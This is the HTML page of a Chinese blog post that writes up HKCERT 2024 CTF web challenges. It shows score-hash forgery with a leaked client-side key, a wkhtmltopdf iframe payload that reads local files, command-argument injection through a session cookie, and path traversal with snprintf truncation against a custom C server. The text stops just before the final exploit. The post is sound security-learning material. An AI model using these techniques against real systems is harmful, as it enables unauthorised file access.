@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="又是跟的wgpsec打。还是把wgpsec的wp贴一下：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;T7EicKJOOVcwWohy_HTClQ 因为大部分师傅都没啥时间，导致这次被迫打了全栈。最后算是水了个61名。然而我终究还是web手。其他方向学起来还是很费劲的，加上本人也很乏，所以就">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HKCERT 2024 部分 web wp">
+<meta property="og:url" content="https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="又是跟的wgpsec打。还是把wgpsec的wp贴一下：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;T7EicKJOOVcwWohy_HTClQ 因为大部分师傅都没啥时间，导致这次被迫打了全栈。最后算是水了个61名。然而我终究还是web手。其他方向学起来还是很费劲的，加上本人也很乏，所以就">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18543724/01.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18543724/02.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18543724/03.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18543724/04.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18543724/05.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18543724/06.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18543724/07.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18543724/08.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18543724/09.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18543724/10.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18543724/11.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18543724/12.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18543724/13.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18543724/14.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18543724/15.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18543724/16.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18543724/17.png">
+<meta property="article:published_time" content="2024-11-13T05:39:00.000Z">
+<meta property="article:modified_time" content="2024-11-13T05:39:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/18543724/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>HKCERT 2024 部分 web wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2024-11-08-2024-web-pyblockly-wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/&text=HKCERT 2024 部分 web wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/&title=HKCERT 2024 部分 web wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/&is_video=false&description=HKCERT 2024 部分 web wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HKCERT 2024 部分 web wp&body=Check out this article: https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/&title=HKCERT 2024 部分 web wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/&title=HKCERT 2024 部分 web wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/&title=HKCERT 2024 部分 web wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/&title=HKCERT 2024 部分 web wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/&name=HKCERT 2024 部分 web wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/&t=HKCERT 2024 部分 web wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#New-Free-Lunch"><span class="toc-number">1.1.</span> <span class="toc-text">New Free Lunch</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Webpage-to-PDF-1"><span class="toc-number">1.2.</span> <span class="toc-text">Webpage to PDF (1)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Custom-Web-Server-1"><span class="toc-number">1.3.</span> <span class="toc-text">Custom Web Server (1)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mystiz%E2%80%99s-Mini-CTF-2"><span class="toc-number">1.4.</span> <span class="toc-text">Mystiz’s Mini CTF (2)</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HKCERT 2024 部分 web wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-13T05:39:00.000Z" class="dt-published" itemprop="datePublished">2024-11-13</time>
+        
+        (Updated: <time datetime="2024-11-13T05:39:00.000Z" class="dt-updated" itemprop="dateModified">2024-11-13</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/PHP/" rel="tag">PHP</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><img src="/images/migrated/18543724/01.png"></p>
+<p>又是跟的wgpsec打。还是把wgpsec的wp贴一下：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/T7EicKJOOVcwWohy_HTClQ">https://mp.weixin.qq.com/s/T7EicKJOOVcwWohy_HTClQ</a></p>
+<p>因为大部分师傅都没啥时间，导致这次被迫打了全栈。最后算是水了个61名。然而我终究还是web手。其他方向学起来还是很费劲的，加上本人也很乏，所以就只写点web。</p>
+<p>一样的，我把web部分写详细点。让我们开始吧！</p>
+<p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1">WEB</a></strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.1">New Free Lunch</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.2">Webpage to PDF (1)</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.3">Custom Web Server (1)</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.4">Mystiz’s Mini CTF (2)</a></li>
+</ul>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="New-Free-Lunch"><a href="#New-Free-Lunch" class="headerlink" title="New Free Lunch"></a>New Free Lunch</h2><p>签到题</p>
+<p>黑盒。进去一个登陆注册页面，看了一下无注入，无泄露，无弱密码，正常注册账号登录。</p>
+<p><img src="/images/migrated/18543724/02.png"></p>
+<p>前端逻辑用的js实现，直接看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">async function endGame() &#123;</span><br><span class="line">           clearInterval(gameInterval);</span><br><span class="line">           clearInterval(timerInterval);</span><br><span class="line">           alert(&#x27;Game Over! Your score: &#x27; + score);</span><br><span class="line"></span><br><span class="line">           const hash = generateHash(secretKey + username + score);</span><br><span class="line"></span><br><span class="line">           fetch(&#x27;/update_score.php&#x27;, &#123;</span><br><span class="line">               method: &#x27;POST&#x27;,</span><br><span class="line">               headers: &#123;</span><br><span class="line">                   &#x27;Content-Type&#x27;: &#x27;application/json&#x27;,</span><br><span class="line">                   &#x27;Authorization&#x27;: `Bearer $&#123;token&#125;`</span><br><span class="line">               &#125;,</span><br><span class="line">               body: JSON.stringify(&#123;</span><br><span class="line">                   score: score,</span><br><span class="line">                   hash: hash</span><br><span class="line">               &#125;)</span><br><span class="line">           &#125;)</span><br><span class="line">           .then(response =&gt; response.json())</span><br><span class="line">           .then(data =&gt; &#123;</span><br><span class="line">               if (data.success) &#123;</span><br><span class="line">                   alert(&#x27;Score updated!&#x27;);</span><br><span class="line">               &#125; else &#123;</span><br><span class="line">                   alert(&#x27;Failed to update score.&#x27;);</span><br><span class="line">               &#125;</span><br><span class="line">               location.reload();</span><br><span class="line">           &#125;);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意到提交分数的函数。显然，这里将secretKey，username, score拼起来求sha256来验证分数的合法性。跟进。在代码中找到明文secretKey</p>
+<p><img src="/images/migrated/18543724/03.png"></p>
+<p>使用sha256伪造签名</p>
+<p><img src="/images/migrated/18543724/04.png"></p>
+<p>随便玩一次，提交分数时用burp抓包，更改分数</p>
+<p><img src="/images/migrated/18543724/05.png"></p>
+<p>前往积分榜拿flag</p>
+<p><img src="/images/migrated/18543724/06.png"></p>
+<p><strong>hkcert24{r3d33m_f0r_4_fr33_lunch}</strong></p>
+<h2 id="Webpage-to-PDF-1"><a href="#Webpage-to-PDF-1" class="headerlink" title="Webpage to PDF (1)"></a>Webpage to PDF (1)</h2><p>签到题。</p>
+<p>考的是wkhtmltopdf中xss读取本地文件的漏洞。这里直接在jsbin上起一个带file协议读取的website让靶机获取即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Flag&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;iframe src=&quot;file:///flag.txt&quot; width=&quot;100%&quot; height=&quot;100%&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18543724/07.png"></p>
+<p>然而在这里因为wkhtmltopdf本身的防护读不到本地的文件，需要加上<code>--enable-local-file-access</code>。可以看到，在源码里存在命令拼接的漏洞。</p>
+<p><img src="/images/migrated/18543724/08.png"></p>
+<p>这里session_id可控，直接在cookie session前加上<code>--enable-local-file-access</code>即可。随后就会变成如下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wkhtmltopdf --enable-local-file-access &#123;SESSION_ID&#125;.html --enable-local-file-access &#123;SESSION_ID&#125;.pdf</span><br></pre></td></tr></table></figure>
+
+<p>从而读取本地文件</p>
+<p><img src="/images/migrated/18543724/09.png"></p>
+<p>随后访问<code>/9d6bd64c-dfb1-44be-acd6-72b24088b9f8.pdf</code>即可</p>
+<p><img src="/images/migrated/18543724/10.png"></p>
+<p><strong>hkcert24{h0w-t0-use-AI-wisely-and-s4fe1y?}</strong></p>
+<h2 id="Custom-Web-Server-1"><a href="#Custom-Web-Server-1" class="headerlink" title="Custom Web Server (1)"></a>Custom Web Server (1)</h2><p>下载附件，读</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;netinet/in.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdbool.h&gt;</span><br><span class="line"></span><br><span class="line">#define PORT 8000</span><br><span class="line">#define BUFFER_SIZE 1024</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">    char *content;</span><br><span class="line">    int size;</span><br><span class="line">&#125; FileWithSize;</span><br><span class="line"></span><br><span class="line">bool ends_with(char *text, char *suffix) &#123;</span><br><span class="line">    int text_length = strlen(text);</span><br><span class="line">    int suffix_length = strlen(suffix);</span><br><span class="line"></span><br><span class="line">    return text_length &gt;= suffix_length &amp;&amp; \</span><br><span class="line">           strncmp(text+text_length-suffix_length, suffix, suffix_length) == 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FileWithSize *read_file(char *filename) &#123;</span><br><span class="line">    if (!ends_with(filename, &quot;.html&quot;) &amp;&amp; !ends_with(filename, &quot;.png&quot;) &amp;&amp; !ends_with(filename, &quot;.css&quot;) &amp;&amp; !ends_with(filename, &quot;.js&quot;)) return NULL;</span><br><span class="line"></span><br><span class="line">    char real_path[BUFFER_SIZE];</span><br><span class="line">    snprintf(real_path, sizeof(real_path), &quot;public/%s&quot;, filename);</span><br><span class="line"></span><br><span class="line">    FILE *fd = fopen(real_path, &quot;r&quot;);</span><br><span class="line">    if (!fd) return NULL;</span><br><span class="line"></span><br><span class="line">    fseek(fd, 0, SEEK_END);</span><br><span class="line">    long filesize = ftell(fd);</span><br><span class="line">    fseek(fd, 0, SEEK_SET);</span><br><span class="line"></span><br><span class="line">    char *content = malloc(filesize + 1);</span><br><span class="line">    if (!content) return NULL;</span><br><span class="line"></span><br><span class="line">    fread(content, 1, filesize, fd);</span><br><span class="line">    content[filesize] = &#x27;\0&#x27;;</span><br><span class="line"></span><br><span class="line">    fclose(fd);</span><br><span class="line"></span><br><span class="line">    FileWithSize *file = malloc(sizeof(FileWithSize));</span><br><span class="line">    file-&gt;content = content;</span><br><span class="line">    file-&gt;size = filesize;</span><br><span class="line"> </span><br><span class="line">    return file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void build_response(int socket_id, int status_code, char* status_description, FileWithSize *file) &#123;</span><br><span class="line">    char *response_body_fmt = </span><br><span class="line">        &quot;HTTP/1.1 %u %s\r\n&quot;</span><br><span class="line">        &quot;Server: mystiz-web/1.0.0\r\n&quot;</span><br><span class="line">        &quot;Content-Type: text/html\r\n&quot;</span><br><span class="line">        &quot;Connection: %s\r\n&quot;</span><br><span class="line">        &quot;Content-Length: %u\r\n&quot;</span><br><span class="line">        &quot;\r\n&quot;;</span><br><span class="line">    char response_body[BUFFER_SIZE];</span><br><span class="line"></span><br><span class="line">    sprintf(response_body,</span><br><span class="line">            response_body_fmt,</span><br><span class="line">            status_code,</span><br><span class="line">            status_description,</span><br><span class="line">            status_code == 200 ? &quot;keep-alive&quot; : &quot;close&quot;,</span><br><span class="line">            file-&gt;size);</span><br><span class="line">    write(socket_id, response_body, strlen(response_body));</span><br><span class="line">    write(socket_id, file-&gt;content, file-&gt;size);</span><br><span class="line">    free(file-&gt;content);</span><br><span class="line">    free(file);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void handle_client(int socket_id) &#123;</span><br><span class="line">    char buffer[BUFFER_SIZE];</span><br><span class="line">    char requested_filename[BUFFER_SIZE];</span><br><span class="line"></span><br><span class="line">    while (1) &#123;</span><br><span class="line">        memset(buffer, 0, sizeof(buffer));</span><br><span class="line">        memset(requested_filename, 0, sizeof(requested_filename));</span><br><span class="line"></span><br><span class="line">        if (read(socket_id, buffer, BUFFER_SIZE) == 0) return;</span><br><span class="line"></span><br><span class="line">        if (sscanf(buffer, &quot;GET /%s&quot;, requested_filename) != 1)</span><br><span class="line">            return build_response(socket_id, 500, &quot;Internal Server Error&quot;, read_file(&quot;500.html&quot;));</span><br><span class="line"></span><br><span class="line">        FileWithSize *file = read_file(requested_filename);</span><br><span class="line">        if (!file)</span><br><span class="line">            return build_response(socket_id, 404, &quot;Not Found&quot;, read_file(&quot;404.html&quot;));</span><br><span class="line"></span><br><span class="line">        build_response(socket_id, 200, &quot;OK&quot;, file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    setvbuf(stdin, NULL, _IONBF, 0);</span><br><span class="line">    setvbuf(stdout, NULL, _IONBF, 0);</span><br><span class="line">    setvbuf(stderr, NULL, _IONBF, 0);</span><br><span class="line"></span><br><span class="line">    struct sockaddr_in server_address;</span><br><span class="line">    struct sockaddr_in client_address;</span><br><span class="line"></span><br><span class="line">    int socket_id = socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">    server_address.sin_family = AF_INET;</span><br><span class="line">    server_address.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">    server_address.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    if (bind(socket_id, (struct sockaddr*)&amp;server_address, sizeof(server_address)) == -1) exit(1);</span><br><span class="line">    if (listen(socket_id, 5) &lt; 0) exit(1);</span><br><span class="line"></span><br><span class="line">    while (1) &#123;</span><br><span class="line">        int client_address_len;</span><br><span class="line">        int new_socket_id = accept(socket_id, (struct sockaddr *)&amp;client_address, (socklen_t*)&amp;client_address_len);</span><br><span class="line">        if (new_socket_id &lt; 0) exit(1);</span><br><span class="line">        int pid = fork();</span><br><span class="line">        if (pid == 0) &#123;</span><br><span class="line">            handle_client(new_socket_id);</span><br><span class="line">            close(new_socket_id);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到C语言自制http服务器应激想到溢出和截断。显然，服务器上存在一个路径穿越漏洞，如图</p>
+<p><img src="/images/migrated/18543724/11.png"></p>
+<p>然而这里有一个后缀的白名单，读取不到flag.txt</p>
+<p>首先尝试了%00截断，无果。接着找截断的sink。</p>
+<p>注意到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snprintf(real_path, sizeof(real_path), &quot;public/%s&quot;, filename);</span><br></pre></td></tr></table></figure>
+
+<p>中real_path的大小是固定的1024字节（常量buffer_size）且在白名单检测之后，因此，此处存在由溢出漏洞导致的截断。</p>
+<p>写个demo模拟一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;netinet/in.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdbool.h&gt;</span><br><span class="line">bool ends_with(char *text, char *suffix) &#123;</span><br><span class="line">    int text_length = strlen(text);</span><br><span class="line">    int suffix_length = strlen(suffix);</span><br><span class="line"></span><br><span class="line">    return text_length &gt;= suffix_length &amp;&amp; \</span><br><span class="line">           strncmp(text+text_length-suffix_length, suffix, suffix_length) == 0;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	char *filename = &quot;../flag.txt.html&quot;;</span><br><span class="line">    if (!ends_with(filename, &quot;.html&quot;) &amp;&amp; !ends_with(filename, &quot;.png&quot;) &amp;&amp; !ends_with(filename, &quot;.css&quot;) &amp;&amp; !ends_with(filename, &quot;.js&quot;)) return 0;</span><br><span class="line"></span><br><span class="line">    char real_path[19];</span><br><span class="line">	snprintf(real_path, sizeof(real_path), &quot;public/%s&quot;, filename);</span><br><span class="line">	printf(real_path);</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18543724/12.png"></p>
+<p>这证实了我们的猜想。于是直接手搓payload发包GetFlag</p>
+<p>exp：</p>
